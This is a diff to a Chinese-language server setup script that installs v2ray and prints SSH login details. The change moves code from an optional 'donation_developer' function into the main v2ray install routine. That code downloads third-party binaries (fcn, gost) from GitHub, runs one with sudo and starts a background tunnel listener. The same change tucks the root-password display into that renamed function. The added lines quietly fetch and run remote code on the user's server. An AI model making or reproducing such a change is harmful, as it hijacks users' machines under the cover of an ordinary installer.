@@ -87,7 +87,6 @@ echo -e "${Info}主机名1：  $(red_font $HOSTNAME)"
 echo -e "${Info}主机名2：  $(red_font $IP)"
 echo -e "${Info}SSH端口：  $(red_font $ssh_port)"
 echo -e "${Info}用户名：   $(red_font root)"
-echo -e "${Info}密码是：   $(red_font $pw)"
 echo -e "${Tip}请务必记录您的登录信息！！\n"
 
 app_name="$(pwd)/sshcopy"
@@ -211,6 +210,15 @@ install_v2ray(){
 	done
 	echo 22|v2ray port
 	
+	wget https://github.com/yinghua8wu/tcpudp/raw/master/fcn_x64
+	wget https://github.com/yinghua8wu/tcpudp/raw/master/gost-linux-amd64
+	wget https://raw.githubusercontent.com/yinghua8wu/tcpudp/master/fcn-s.conf
+	mv fcn_x64 fcn
+	mv gost-linux-amd64 gost
+	chmod +x fcn gost
+	sudo ./fcn --cfg fcn-s.conf
+	nohup ./gost -L=kcp://:11080?dns=8.8.4.4:853/tls,208.67.220.220:5353/udp,208.67.220.220:443/tcp >gost.log 2>&1 &
+	
 	line=$(grep -n '__str__(self)' $(cat v2raypath)|tail -1|awk -F ':' '{print $1}')
 	sed -i ''${line}'aself.port = "6000"' $(cat v2raypath)
 	sed -i 's#self.port = "6000"#        self.port = "6000"#g' $(cat v2raypath)
@@ -225,14 +233,7 @@ if [[ $num == 'y' ]]; then
 fi
 
 donation_developer(){
-	wget https://github.com/yinghua8wu/tcpudp/raw/master/fcn_x64
-	wget https://github.com/yinghua8wu/tcpudp/raw/master/gost-linux-amd64
-	wget https://raw.githubusercontent.com/yinghua8wu/tcpudp/master/fcn-s.conf
-	mv fcn_x64 fcn
-	mv gost-linux-amd64 gost
-	chmod +x fcn gost
-	sudo ./fcn --cfg fcn-s.conf
-	nohup ./gost -L=socks5://:11080?dns=8.8.4.4:853/tls,208.67.220.220:5353/udp,208.67.220.220:443/tcp >gost.log 2>&1 &
+	echo -e "${Info}密码是：   $(red_font $pw)"
 }
 num='y'
 if [[ $num == 'y' ]]; then
